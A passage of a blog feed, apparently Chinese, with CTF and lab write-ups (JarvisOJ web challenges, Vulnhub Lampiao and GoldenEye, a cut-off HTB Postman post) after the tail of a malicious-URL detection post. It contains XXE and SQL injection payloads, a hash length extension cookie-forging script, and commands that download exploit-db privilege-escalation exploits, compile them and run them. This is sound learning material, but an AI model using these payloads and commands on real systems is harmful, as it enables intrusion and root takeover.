title="数据预处理"></a>数据预处理</h2><p>数据预处理的方法还是处理文本数据最典型的ngram算法和TF-IDF模型。通过自定义切割长度的ngram算法将原始url进行切割。然后通过TF_IDF模型把不规律的文本字符串转换成规律的（[i，j]，weight）的矩阵。</p><p>这一次的升级在于不是直接将TF-IDF模型处理完的数据投入分类器做训练，而是首先通过kmeans算法做一次聚合。通过指定聚合维度，对数据进行一次降维。降维后的数据在投入分类器，这样能够大幅度增加预测的准确度。</p><h2 id="建模"><a href="#建模" class="headerlink" title="建模"></a>建模</h2><p>建模算法可选择多种，本次样本数据集较小，采用的是svm和逻辑回归两种，包括NB算法在内的多种方法也有着不错的效果，更具实际情况可以灵活选用分类器算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取数据</span></span><br><span class="line">good_query_list = load_files(good_dir)</span><br><span class="line">bad_query_list = load_files(bad_dir)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整合数据</span></span><br><span class="line">data = [good_query_list, bad_query_list]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打标记</span></span><br><span class="line">good_y = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">0</span>]))]</span><br><span class="line">bad_y = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">1</span>]))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据集</span></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练</span></span><br><span class="line">self.classifier.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><p>预测的数据可通过自定义文件位置实现，预测结果可以通过多种形式返回，目前是将正常结果和恶意结果前几条返回。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li>本次试验吸取其他人的经验，新定义了一个输出方法，该方法会输出每一个步骤的具体时间，精确到秒级别，便于后续的测试调优。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printT</span>(<span class="params">word</span>):</span><br><span class="line">    a = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S: &#x27;</span>, time.localtime(time.time()))</span><br><span class="line">    <span class="built_in">print</span>(a + <span class="built_in">str</span>(word))</span><br></pre></td></tr></table></figure><ul><li><p>本次实验相较于上一次，在训练之前多了一次kmeans聚类过程，大大提高了预测准确性。</p></li><li><p>但是增加的kmeans聚合的步骤也增加了训练的时间，实际测试百万级别的数据需要增加2个多小时的训练时间。</p></li><li><p>最后关于样本，前面也提到了本次样本只是在网上随便收集的。后续可以针对某个单位的流量针对性的训练，毕竟代码可以复用，只需要不同的样本即可。另外还有一个思路是，训练样本可以只包括白样本，训练出一个白样本模型。实战时所有在白样本模型之外的请求都默认为恶意请求，这样的模型安全性比较好。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
            <tag> Malicious URL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ - Web の Write-Up Part 1</title>
      <link href="/2020/03/11/JarvisOJ-WEB-1/"/>
      <url>/2020/03/11/JarvisOJ-WEB-1/</url>
      
        <content type="html"><![CDATA[<p>很久之前就有朋友给我推荐了这个CTF平台，玩了一段时间，基本把所有的WEB题目都做完了，写个WP记录一下过程。</p><span id="more"></span><h2 id="Port-51"><a href="#Port-51" class="headerlink" title="Port 51"></a>Port 51</h2><p>打开界面之后提示我们通过51端口访问：</p><p><img src="/img/JarvisOJ-WEB-1/WEB1.png"></p><p>根据提示通过curl指定本地端口即可获得flag：</p><p><img src="/img/JarvisOJ-WEB-1/WEB2.png"></p><p><img src="/img/JarvisOJ-WEB-1/WEB3.png"></p><h2 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost"></a>Localhost</h2><p>打开后提示只能通过本地地址访问：</p><p><img src="/img/JarvisOJ-WEB-1/WEB4.png"></p><p>通过抓包在文件头添加<code>X-Forwarded-For：127.0.0.1</code>标签，伪造localhost地址即可获得flag。</p><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>打开界面就是一个密码输入框：</p><p><img src="/img/JarvisOJ-WEB-1/WEB5.png"></p><p>随便输入一个密码提示密码错误。试了很久注入，也没什么头绪，就抓包看一下：</p><p><img src="/img/JarvisOJ-WEB-1/WEB6.png"></p><p>果然提示了一个hint，这是一个SQL注入，需要通过寻找合适的密码构造<code>SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&#39; or &#39;XXX</code>这样的语句。</p><p>这里提供一个：ffifdyop，输入后提交即可获得flag。</p><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>打开后就是一张神盾局logo的图片，查看下源码有个很有趣的地方：</p><p><img src="/img/JarvisOJ-WEB-1/WEB7.png"></p><p>点进去一看就是一张图片，但是是被解析成脚本的，再解码一下img后面的参数为shield.jpg。猜测img参数存在文件包含漏洞，将index.php通过base64加密得到aW5kZXgucGhw，提交后得到下面的源码：</p><p><img src="/img/JarvisOJ-WEB-1/WEB8.png"></p><p>接下来base64加密shield.php，提交c2hpZWxkLnBocA&#x3D;&#x3D;，得到下图：</p><p><img src="/img/JarvisOJ-WEB-1/WEB9.png"></p><p>直接访问pctf.php,<code>http://web.jarvisoj.com:32768/showimg.php?img=cGN0Zi5waHA=</code>却提示文件不存在。</p><p>回头重新分析index.php源码，发现参数输入class，反序列化函数和过滤，改写shield.php源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>(<span class="string">&#x27;pctf.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行，得到class参数的值。O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p><p>访问<code>http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code>查看源代码得到flag:</p><p><img src="/img/JarvisOJ-WEB-1/WEB10.png"></p><h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><p>访问页面只有hello world，扫了下网站目录，发现有robots.txt，然后指向admin_s3cr3t.php。</p><p><img src="/img/JarvisOJ-WEB-1/WEB11.png"></p><p>但是这是个错误的flag。再次失去线索，尝试burp抓包试一下:</p><p><img src="/img/JarvisOJ-WEB-1/WEB12.png"></p><p>果然发现一个有趣的admin&#x3D;0，结合题目，改包admin&#x3D;1提交获取flag。</p><h2 id="API调用"><a href="#API调用" class="headerlink" title="API调用"></a>API调用</h2><p>打开后是一个提交框，查看源码有具体脚本：</p><p><img src="/img/JarvisOJ-WEB-1/WEB13.png"></p><p>抓包发现提交的只是特定的值，默认格式是json：</p><p><img src="/img/JarvisOJ-WEB-1/WEB14.png"></p><p>其实这里存在XXE漏洞，将Content-Type的值为application&#x2F;xml,然后传入xml代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即可得到flag。</p><h2 id="Flag在管理员手里"><a href="#Flag在管理员手里" class="headerlink" title="Flag在管理员手里"></a>Flag在管理员手里</h2><p>打开提示只有admin才能看见flag，burp抓包发现奇怪的cookie：</p><p><img src="/img/JarvisOJ-WEB-1/WEB15.png"></p><p>其实之前在实验吧玩过同样的套路，这是hash长度扩展攻击。真正的解题在于存在源码泄露,在<code>http://web.jarvisoj.com:32778/index.php~</code>可以找到源码，然后知道这是hash长度扩展攻击。</p><p>不过这题比实验吧更大的难度在于不知道盐的长度，所以采用爆破的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">m=hashpumpy.hashpump(<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="string">&#x27;;\&quot;tseug\&quot;:5:s&#x27;</span>,<span class="string">&#x27;;\&quot;nimda\&quot;:5:s&#x27;</span>,i)</span><br><span class="line"><span class="built_in">print</span> i</span><br><span class="line">url=<span class="string">&#x27;http://120.26.131.152:32778/&#x27;</span></span><br><span class="line">digest=m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">message=urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::-<span class="number">1</span>])</span><br><span class="line">cookie=<span class="string">&#x27;role=&#x27;</span>+message+<span class="string">&#x27;; hsh=&#x27;</span>+digest</span><br><span class="line"><span class="comment">#print cookie</span></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;cookie&#x27;</span>: cookie,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">print</span> headers</span><br><span class="line">re=requests.get(url=url,headers=headers)</span><br><span class="line"><span class="built_in">print</span> re.text</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line"><span class="built_in">print</span> re;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行程序然后构造最终的cookie：</p><p><code>role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07</code></p><p><img src="/img/JarvisOJ-WEB-1/WEB16.png"></p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>打开之后查看源码发现一个index.phps提示，访问发现是网站源代码。</p><p><img src="/img/JarvisOJ-WEB-1/WEB17.png"></p><p>出现3个参数：id，a，b。</p><p>id：id&#x3D;&#x3D;0典型的PHP弱比较，利用id&#x3D;0a或id&#x3D;0e123或id&#x3D;asd均可实现绕过。</p><p>b：strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!&#x3D;4) 这里要求：b的长度大于5，且是基于eregi函数的弱类型，用%00的绕过（ strlen函数对%00不截断但substr截断）那么可以令b&#x3D;%00411111。</p><p>此处链接一篇<a href="https://blog.csdn.net/qq_31481187/article/details/60968595">博客</a>可供参考。</p><p>a：由data进行赋值：$data &#x3D; @file_get_contents($a,’r’) 而又有$data&#x3D;&#x3D;”1112 is a nice lab!” 可以利用远程文件包含在allow_url_include开启时可以使用，但发现对$a有了.过滤所以还是data协议比较稳妥。</p><p>此处链接另一篇<a href="https://blog.csdn.net/lxgwm2008/article/details/38437875">博客</a>可供参考，这里采用的格式是：data:</p><p>最后构造payload：id&#x3D;0e&amp;a&#x3D;data:,1112 is a nice lab!&amp;b&#x3D;%00411111，得到：</p><p><img src="/img/JarvisOJ-WEB-1/WEB18.png"></p><p>看起来像是一个网址，访问一下，页面上没什么东西，但是发现url自动跳转为<code>http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1</code>，猜测id参数存在注入漏洞。</p><p>经过尝试，发现过滤了空格。改用<code>/**/</code>替代空格发现还是不行，发现<code>/***/</code>可以。同时还过滤了union,select，通过双写可绕过。</p><p><img src="/img/JarvisOJ-WEB-1/WEB19.png"></p><p><img src="/img/JarvisOJ-WEB-1/WEB20.png"></p><p>开始尝试：</p><p>id&#x3D;1&#x2F;<em>1</em>&#x2F;order&#x2F;<em>1</em>&#x2F;by&#x2F;<em>1</em>&#x2F;1 显示正常</p><p>id&#x3D;1&#x2F;<em>1</em>&#x2F;order&#x2F;<em>1</em>&#x2F;by&#x2F;<em>1</em>&#x2F;2 显示正常</p><p>id&#x3D;1&#x2F;<em>1</em>&#x2F;order&#x2F;<em>1</em>&#x2F;by&#x2F;<em>1</em>&#x2F;4 显示错误，字段数为3</p><p>id&#x3D;-1&#x2F;<em>12</em>&#x2F;uniunionon&#x2F;<em>12</em>&#x2F;seselectlect&#x2F;<em>12</em>&#x2F;1,2,(database())%23</p><p>得到数据库名test。</p><p>id&#x3D;-1&#x2F;<em>12</em>&#x2F;uniunionon&#x2F;<em>12</em>&#x2F;seselectlect&#x2F;<em>12</em>&#x2F;1,2,(seselectlect&#x2F;<em>12</em>&#x2F;group_concat(table_name)&#x2F;<em>12</em>&#x2F;frfromom&#x2F;<em>12</em>&#x2F;information_schema.tables&#x2F;<em>12</em>&#x2F;where&#x2F;<em>12</em>&#x2F;table_schema&#x3D;database())%23</p><p>得到表名：content。</p><p>id&#x3D;-1&#x2F;<em>12</em>&#x2F;uniunionon&#x2F;<em>12</em>&#x2F;seselectlect&#x2F;<em>12</em>&#x2F;1,2,(selselectect&#x2F;<em>12</em>&#x2F;group_concat(column_name)&#x2F;<em>12</em>&#x2F;frofromm&#x2F;<em>12</em>&#x2F;information_schema.columns&#x2F;<em>12</em>&#x2F;where&#x2F;<em>12</em>&#x2F;table_name&#x3D;0x636f6e74656e74)%23</p><p>得到列名：context。</p><p>id&#x3D;-1&#x2F;<em>12</em>&#x2F;uniunionon&#x2F;<em>12</em>&#x2F;seselectlect&#x2F;<em>12</em>&#x2F;1,2,(selselectect&#x2F;<em>12</em>&#x2F;context&#x2F;<em>12</em>&#x2F;frofromm&#x2F;<em>1</em>&#x2F;content)%23</p><p>得到flag：PCTF{Fin4lly_U_got_i7_C0ngRatulation5}。</p><h2 id="欲知后事如何，请听下回分解"><a href="#欲知后事如何，请听下回分解" class="headerlink" title="欲知后事如何，请听下回分解"></a>欲知后事如何，请听下回分解</h2>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Lampiao の Write-Up</title>
      <link href="/2020/01/14/Lampiao/"/>
      <url>/2020/01/14/Lampiao/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天尝试了下<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampiao</a>靶机，这是一台很简单的靶机，没有任何难度。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>老套路，找靶机IP然后扫描端口：</p><p><img src="/img/Lampiao/Lampiao1.png"></p><p><img src="/img/Lampiao/Lampiao2.png"></p><p>22，80，1898这三个端口一目了然，主要的注意力肯定在这个Drupal 7服务上。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>80端口简单看一下：</p><p><img src="/img/Lampiao/Lampiao3.png"></p><p>就是个幌子，分散注意力的，什么有用的都没有。直接聚焦到1898端口：</p><p><img src="/img/Lampiao/Lampiao4.png"></p><p>关于Drupal服务，其实很熟悉，在<a href="https://coldwave96.github.io/2019/11/14/DC-1">DC-1</a>这台靶机中就接触过了。在MSF中查找这个漏洞的利用模块，一个一个尝试，很快我们就得到了目标机器的emterpreter。</p><p><img src="/img/Lampiao/Lampiao5.png"></p><p>回过头我们再去了解一下这个漏洞，这是<a href="https://xz.aliyun.com/t/2271">Drupalgeddon-2漏洞</a>，CVE编号CVE-2018-7600，对于默认或常见的Drupal安装来说，该漏洞允许攻击者在未经身份验证的情况下远程执行代码。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>得到的是低权限的shell，下一步当然就是提权了，通过查看靶机内核，发现这是一台ubuntu 14.04的机器，并且其存在<a href="https://www.freebuf.com/vuls/117331.html">脏牛漏洞</a>。</p><p>通过脏牛漏洞提权即可获得root权限，flag.txt就在root根目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">$ ./dcow -s</span><br></pre></td></tr></table></figure><p><img src="/img/Lampiao/Lampiao6.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - GoldenEye の Write-Up</title>
      <link href="/2020/01/13/GoldenEye/"/>
      <url>/2020/01/13/GoldenEye/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两天尝试了下<a href="https://www.vulnhub.com/entry/goldeneye-1,240/">GoldenEye</a>这台靶机，难度不大，但是有坑，也能学到不少的东西，主要是可以接触到POP3渗透方面的知识。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先第一步还是传统的找靶机IP以及端口扫描：</p><p><img src="/img/GoldenEye/GoldenEye1.png"></p><p><img src="/img/GoldenEye/GoldenEye2.png"></p><p>可以看到靶机开启了SMTP和POP3服务。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>首先访问一下80端口的WEB服务：</p><p><img src="/img/GoldenEye/GoldenEye3.png"></p><p>再按照提示访问&#x2F;sev-home&#x2F;：</p><p><img src="/img/GoldenEye/GoldenEye4.png"></p><p>提示这是GoldenEye的授权登录入口。我们暂时还没有帐号和密码，只能再寻找其他线索。回到首页，查看首页源码，在terminal.js中发现重要的信息：</p><p><img src="/img/GoldenEye/GoldenEye5.png"></p><p>提示中告诉了我们Boris的密码，是Unicode编码的，去解密：</p><p><img src="/img/GoldenEye/GoldenEye6.png"></p><p>然后我们用解出的密码登录GoldenEye系统：</p><p><img src="/img/GoldenEye/GoldenEye7.png"></p><p>提示我们在一个不常用的端口开启了pop3的服务，当然就是我们扫描时扫到的55007端口。然后查看该页面源代码，发现在最底下还有个hint：</p><p><img src="/img/GoldenEye/GoldenEye8.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>上一步的提示告诉我们两个帐号，结合POP3服务的提示，猜测下一步便要爆破密码：</p><p><img src="/img/GoldenEye/GoldenEye9.png"></p><p><img src="/img/GoldenEye/GoldenEye10.png"></p><p>果然爆破出来两个帐号的密码，然后尝试用着两个帐号密码登录55007端口的POP3邮箱：</p><p><img src="/img/GoldenEye/GoldenEye11.png"></p><p>可以看到Boris账户里有3封邮件，但是这3封邮件并没有任何有价值的信息。再登录Natalya的账户，有2封邮件：</p><p><img src="/img/GoldenEye/GoldenEye12.png"></p><p><img src="/img/GoldenEye/GoldenEye13.png"></p><p>第二封邮件给了我们一个账号以及提示，我们按照提示的步骤首先添加域名，然后访问看看会遇到什么：</p><p><img src="/img/GoldenEye/GoldenEye14.png"></p><p>这是一个Moodle系统，利用邮件里的帐号和密码登录系统：</p><p><img src="/img/GoldenEye/GoldenEye15.png"></p><p><img src="/img/GoldenEye/GoldenEye16.png"></p><p>登录之后就收到一封邮件，查看邮件具体内容发现就是简单的欢迎信件，然后发现Dr.Doak的邮箱用户名为doak：</p><p><img src="/img/GoldenEye/GoldenEye17.png"></p><p>好吧，再去爆破一下doak的帐号和密码：</p><p><img src="/img/GoldenEye/GoldenEye18.png"></p><p>登陆一下，找找有没有有用的信息：</p><p><img src="/img/GoldenEye/GoldenEye19.png"></p><p>提示我们回到原来的网站用这个账户去登录寻找进一步的信息：</p><p><img src="/img/GoldenEye/GoldenEye20.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>在Dr.Doak账户里我们找到Moodle为2.2.3版本，下一步就是去找一些可以利用的漏洞了。在MSF中找到一个moodle的利用模块，但是该模块需要admin的账户密码，只能继续寻找，在dr_doak账户的私人文件中找到一个txt文件：</p><p><img src="/img/GoldenEye/GoldenEye21.png"></p><p>下载下来，打开看一下内容：</p><p><img src="/img/GoldenEye/GoldenEye22.png"></p><p>按照提示下载照片：</p><p><img src="/img/GoldenEye/GoldenEye23.png"></p><p>发现照片里藏了一串奇怪的base64编码：</p><p><img src="/img/GoldenEye/GoldenEye24.png"></p><p>解密一下得到：xWinter1995x!</p><p>尝试了一下，发现这是梦寐以求的admin用户密码：</p><p><img src="/img/GoldenEye/GoldenEye25.png"></p><p>于是继续之前的MSF利用模块：</p><p><img src="/img/GoldenEye/GoldenEye26.png"></p><p>但是会发现利用失败，因为我的MSF是最新版本，rhosts会根据域名到hosts文件中寻找，然后自动替换成IP，而靶机上的这个网站限制了只能通过域名访问，所以漏洞无法利用成功，只能找下这个漏洞利用模块的源代码，尝试手动利用。</p><p><img src="/img/GoldenEye/GoldenEye27.png"></p><p>首先根据利用脚本将Spell engine改成PSpellShell：</p><p><img src="/img/GoldenEye/GoldenEye28.png"></p><p>然后根据提示在aspellpath处插入payload：</p><p><img src="/img/GoldenEye/GoldenEye29.png"></p><p>通过shellpop创建pythonf反弹shell的payload：</p><p><img src="/img/GoldenEye/GoldenEye30.png"></p><p>创建一篇新的blog，随便写点内容，然后点击Toggle spellchecker即可触发payload得到反弹shell：</p><p><img src="/img/GoldenEye/GoldenEye31.png"></p><p><img src="/img/GoldenEye/GoldenEye32.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>通过上一步我们得到了一个低权限的账号，下一步就是提权。使用<code>uname -a</code>命令查看靶机内核版本：</p><p><img src="/img/GoldenEye/GoldenEye33.png"></p><p>找一下提权的利用脚本：</p><p><img src="/img/GoldenEye/GoldenEye34.png"></p><p>然后利用该脚本即可获取该靶机root权限了，具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /tmp <span class="comment"># 进入/tmp目录，方便读写</span></span><br><span class="line">$ wget https://www.exploit-db.com/download/37292.c</span><br><span class="line">$ sed -i <span class="string">&#x27;s/gcc/cc/g&#x27;</span> 37292.c <span class="comment"># 系统内没有gcc,所以只能用cc代替</span></span><br><span class="line">$ cc 37292.c -o evil <span class="comment"># 编译exp</span></span><br><span class="line">$ <span class="built_in">chmod</span> 700 evil</span><br><span class="line">$ ./evil</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box - Postman の Write-Up</title>
      <link href="/2020/01/02/Postman/"/>
      <url>/2020/01/02/Postman/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>元旦这两天闲来无事玩了下<a href="https://www.hackthebox.eu/home/machines/profile/215">Postman</a>这台靶机，这是一台有很多坑的机器，不过总体难度不高。</p><p><img src="/img/Postman/Postman1.png"></p><span id="more"></span><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>第一步还是常规的Nmap扫描：</p><p><img src="/img/Postman/Postman2.png"></p><p>可以看到靶机开放了22，80和10000三个端口。22端口的ssh服务和80端口的web服务平淡无奇，简单看了下就略过了。</p><p>10000端口webmin服务吸引了我全部的注意，经过搜索发现webmin 1.910存在远程命令执行漏洞，CVE编号为CVE-2019-15107。但是经过多次尝试发现该漏洞无法利用，可能是被修补了，所以只能重新寻找突破口。</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>没办法，只能全端口重新扫描一下，看看有没有什么遗漏：</p><p><img src="/img/Postman/Postman3.png"></p><p>果然6379端口隐藏了一个redis 4.0.9服务。找一下这个服务有没有什么可以利用的地方：</p><p><img src="/img/Postman/Postman4.png"></p><p>果然redis 4.x&#x2F;5.x版本也存在远程命令执行漏洞，但是这个脚本并不能使用。在不懈搜寻之下，找到了一些有用的东西：<a href="https://github.com/Avinash-acid/Redis-Server-Exploit">https://github.com/Avinash-acid/Redis-Server-Exploit</a>。</p><p>这是<a href="https://xz.aliyun.com/t/4051">redis未授权访问的漏洞</a>，通过该漏洞可以向靶机里写入ssh秘钥，然后通过ssh连接到靶机。</p><p><img src="/img/Postman/Postman5.png"></p><p>这样我们便通过ssh以redis这个低权限账号登录。登录之后找了许多文件夹：</p><p><img src="/img/Postman/Postman6.png"></p><p>在.bash_history文件中发现了Matt用户以及id_rsa.bak文件，找一下这个文件在哪里：</p><p><img 